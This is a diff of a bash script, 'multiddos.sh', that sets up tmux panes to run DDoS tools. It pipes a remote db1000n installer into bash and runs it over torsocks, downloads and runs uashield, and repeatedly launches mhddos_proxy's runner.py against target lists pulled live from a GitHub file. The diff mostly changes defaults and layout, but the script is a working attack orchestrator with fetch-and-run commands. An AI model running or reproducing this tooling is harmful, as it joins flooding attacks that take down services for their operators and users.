@@ -30,28 +30,35 @@ if [[ $gotop == "on" ]]; then
     tmux new-session -s multiddos -d 'gotop -asc solarized'
     sleep 0.2
     tmux split-window -h -p 66 'bash auto_bash.sh'
-else
-    tmux new-session -s multiddos -d 'bash auto_bash.sh'
-    sleep 0.2
+else 
+    if [[ $matrix == "on" ]]; then
+        tmux new-session -s multiddos -d 'cmatrix'
+        sleep 0.2
+        tmux split-window -h -p 66 'bash auto_bash.sh'
+    else
+        sleep 0.2
+        tmux new-session -s multiddos -d 'bash auto_bash.sh'
+    fi
 fi
 
 if [[ $vnstat == "on" ]]; then
+sleep 0.2
 tmux split-window -v 'vnstat -l'
 fi
 
 if [[ $db1000n == "on" ]]; then
+sleep 0.2
 tmux split-window -v 'curl https://raw.githubusercontent.com/Arriven/db1000n/main/install.sh | bash && torsocks -i ./db1000n'
 #tmux split-window -v 'docker run --rm -it --pull always ghcr.io/arriven/db1000n'
 fi
-sleep 0.2
 if [[ $uashield == "on" ]]; then
+sleep 0.2
 tmux split-window -v 'curl -L https://github.com/opengs/uashield/releases/download/v1.0.3/shield-1.0.3.tar.gz -o shield.tar.gz && tar -xzf shield.tar.gz --strip 1 && ./shield'
 fi
+if [[ $matrix == "on" ]] && [[ $gotop == "on" ]]; then
 sleep 0.2
 tmux select-pane -t 0
 sleep 0.2
-if [[ $matrix == "on" ]]; then
-sudo apt install cmatrix -qq -y
 tmux split-window -v 'cmatrix'
 fi
 #tmux -2 attach-session -d
@@ -60,17 +67,18 @@ fi
 usage () {
 cat << EOF
 usage: bash multiddos.sh [-d|-u|-t|-m|-h]
-                            +d | --db1000n        - launch with db1000n
-                            +u | --uashield       - launch with uashield
+                            -d | --db1000n        - disable db1000n
+                            -g | --gotop          - disable gotop
+                            +u | --uashield       - enable uashield
                             -t | --threads        - threads; default = 1000
-                            +m | --matrix         - enter the matrix
-                            +v | --vnstat         - launch vnstat -l (traffic monitoring)
+                            +m | --matrix         - enable matrix
+                            +v | --vnstat         - enable vnstat -l (traffic monitoring)
                             -h | --help           - brings up this menu
 EOF
 exit
 }
 
-if [[ "$1" = ""  ]]; then db1000n="on"; launch; fi
+if [[ "$1" = ""  ]]; then launch; fi
 
 while [ "$1" != "" ]; do
     case $1 in
@@ -90,9 +98,6 @@ sudo apt-get update -q -y
 sudo apt-get install -q -y tmux vnstat torsocks python3 python3-pip
 pip install --upgrade pip
 
-echo "arg: " $threads $rpc $debug
-sleep 5
-
 cat > auto_bash.sh << 'EOF'
 cd ~/multiddos/
 git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git
@@ -111,8 +116,6 @@ pkill -f start.py; pkill -f runner.py
       done
    for (( i=1; i<=list_size; i++ )); do
             cmd_line=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets  | cat | grep "^[^#]")")
-            echo "arg: " $threads $rpc $debug&
-            sleep 5
             python3 ~/multiddos/mhddos_proxy/runner.py $cmd_line $threads $rpc $debug&
       done
 sleep 30m
